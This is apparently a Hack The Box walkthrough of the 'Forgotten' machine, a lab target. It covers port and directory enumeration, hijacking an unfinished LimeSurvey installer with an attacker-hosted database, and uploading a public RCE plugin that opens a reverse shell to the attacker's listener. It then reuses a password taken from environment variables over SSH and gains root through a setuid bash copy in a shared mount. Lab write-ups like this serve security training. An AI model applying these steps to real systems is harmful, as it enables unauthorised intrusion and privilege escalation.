---
layout: post
title: "[HTB] Forgotten"
description: "[Machine] - Easy difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Easy
---

![Forgotten](/img/htb_img/Forgotten_img/img1.png)

- OS: Linux
- Release Date: 16 Sep 2025
- Difficulty: Easy


# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 1200 --open -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:38 CEST
Initiating SYN Stealth Scan at 12:38
Scanning 10.129.13.225 [65535 ports]
Discovered open port 22/tcp on 10.129.13.225
Discovered open port 80/tcp on 10.129.13.225
Completed SYN Stealth Scan at 12:39, 30.05s elapsed (65535 total ports)
Nmap scan report for 10.129.13.225
Host is up, received user-set (0.043s latency).
Scanned at 2025-09-26 12:38:38 CEST for 30s
Not shown: 59378 closed tcp ports (reset), 6155 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.15 seconds
           Raw packets sent: 80184 (3.528MB) | Rcvd: 63176 (2.527MB)

```

Scripts and versions.
```
❯ nmap -p22,80 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:39 CEST
Nmap scan report for 10.129.13.225
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds

```

There is a SSH port open, aswell as a HTTP port.

## TCP 80
![](/img/htb_img/Forgotten_img/img2.png)

We get a 403 error when trying to see the webpage.

### Fuzzing (Feroxbuster)
```
❯ feroxbuster -u http://$target -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
                                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://10.129.13.225
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     Extensions            │ [php, html, txt]
     HTTP methods          │ [GET]
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://10.129.13.225/survey => http://10.129.13.225/survey/
```

We found the directory `survey`, so let's take a look.
![](/img/htb_img/Forgotten_img/img3.png)
It's a LimeSurvey installer webpage.

### LimeSurvey
We can start the installation, because there is not a much else to do here.
It eventually asks us for a database configuration, so in this case we can set up a `mysql`instance on our attacker machine and specify this IP in the server, so the database loads on our machine.
For this we need to deploy a MYSQL instance locally.

```
❯ sudo docker run -p 3306:3306 --rm --name tmp-mysql -e MYSQL_ROOT_PASSWORD=password mysql:latest
```

After entering the necessary data on the webpage, we can see that the database has not yet  been created. We can click on create.
![](/img/htb_img/Forgotten_img/img4.png)

Then we click on `Populate Database`.
After that, we can login with the administrator credentials.
![](/img/htb_img/Forgotten_img/img5.png)

![](/img/htb_img/Forgotten_img/img6.png)

We can see that the version of LimeSurvey is `LimeSurvey CE 6.3.7+231127`.
This has some vulnerabilities so we can exploit it

# Foothold
```
❯ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
Cloning into 'Limesurvey-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 24 (delta 2), reused 0 (delta 0), pack-reused 18 (from 1)
Receiving objects: 100% (24/24), 10.00 KiB | 5.00 MiB/s, done.
Resolving deltas: 100% (5/5), done.
```

We need to edit the `config.xml` file to add compatibility to version 6.0
![](/img/htb_img/Forgotten_img/img7.png)

Then we need to modify the `php-rev.php`, to add our host and port for the reverse shell.
After that, we can zip it and upload it.

```
❯ zip Y1LD1R1M.zip config.xml php-rev.php
updating: config.xml (deflated 57%)
updating: php-rev.php (deflated 61%)
```

## LimeSurvey plugin
We upload the zipped plugin and make a curl to the endpoint to trigger the revshell.
![](/img/htb_img/Forgotten_img/img8.png)

![](/img/htb_img/Forgotten_img/img9.png)

![](/img/htb_img/Forgotten_img/img10.png)

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.15 • 10.10.14.49 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from efaa6f5097ed~10.129.13.225-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.14.49:4444
[+] Got reverse shell from efaa6f5097ed~10.129.13.225-Linux-x86_64 😍 Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/repentance/.penelope/sessions/efaa6f5097ed~10.129.13.225-Linux-x86_64/2025_09_26-13_10_26-277.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[-] Spawn MANUALLY a new shell for this session to operate properly
limesvc@efaa6f5097ed:/$ 
```

And we got a shell.

# Lateral Movement
We seem to be on a container, we are group sudo.
```sh
limesvc@efaa6f5097ed:/$ id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
limesvc@efaa6f5097ed:/$ ip a
bash: ip: command not found
limesvc@efaa6f5097ed:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 14908  bytes 2507798 (2.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16665  bytes 13586047 (12.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1070  bytes 85248 (83.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1070  bytes 85248 (83.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Checking the environmental variables we can see a password.
```sh
limesvc@efaa6f5097ed:/$ env
SHELL=/bin/bash
HOSTNAME=efaa6f5097ed
PHP_VERSION=8.0.30
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/
APACHE_LOG_DIR=/var/log/apache2
LANG=C
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev               make             pkg-config              re2c
LIMESURVEY_PASS=5W5HN4K4GCXf9E
TERM=xterm-256color
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
LIMESURVEY_ADMIN=limesvc
APACHE_RUN_GROUP=limesvc
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=3
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
APACHE_RUN_DIR=/var/run/apache2
APACHE_ENVVARS=/etc/apache2/envvars
APACHE_RUN_USER=limesvc
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env
```

```
5W5HN4K4GCXf9E
```

## Trying SSH
Using the same username and the password, we can login directly to ssh.
```sh
❯ ssh limesvc@$target
(limesvc@10.129.13.225) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Sep 26 11:14:34 UTC 2025

  System load:  0.02              Processes:             228
  Usage of /:   59.5% of 6.60GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.129.13.225
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

limesvc@forgotten:~$ 
```

### User flag
```sh
limesvc@forgotten:~$ cat user.txt 
<REDACTED>
```

We can also become root in the container because we have the permission to do it, with a simple `sudo su`.

# Privilege Escalation
We can check the mounted devices on the container.
```sh
root@efaa6f5097ed:/# mount
...
/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/root on /var/www/html/survey type ext4 (rw,relatime,discard,errors=remount-ro)
...
```

Interesting directory at `/var/www/html/survey`.
If we create a file here we can check on the main machine where is it and if we can see it.

```
limesvc@forgotten:~$ find / -name thing.txt -type f 2>/dev/null
/opt/limesurvey/thing.txt

```

So, it's mounted on /opt/limesurvey.

In the container we copy and modify a version of the `bash` binary, in a way that it can be executed by anyone with root perms.
```sh
root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash .
root@efaa6f5097ed:/var/www/html/survey# chmod u+s bash 
```

And, in the main machine we can execute this because it's linked.
```sh
limesvc@forgotten:/opt/limesurvey$ ./bash -p
bash-5.1# id
uid=2000(limesvc) gid=2000(limesvc) euid=0(root) groups=2000(limesvc)
bash-5.1# cat /root/root.txt 
<REDACTED>
bash-5.1# 
```

---
---
---
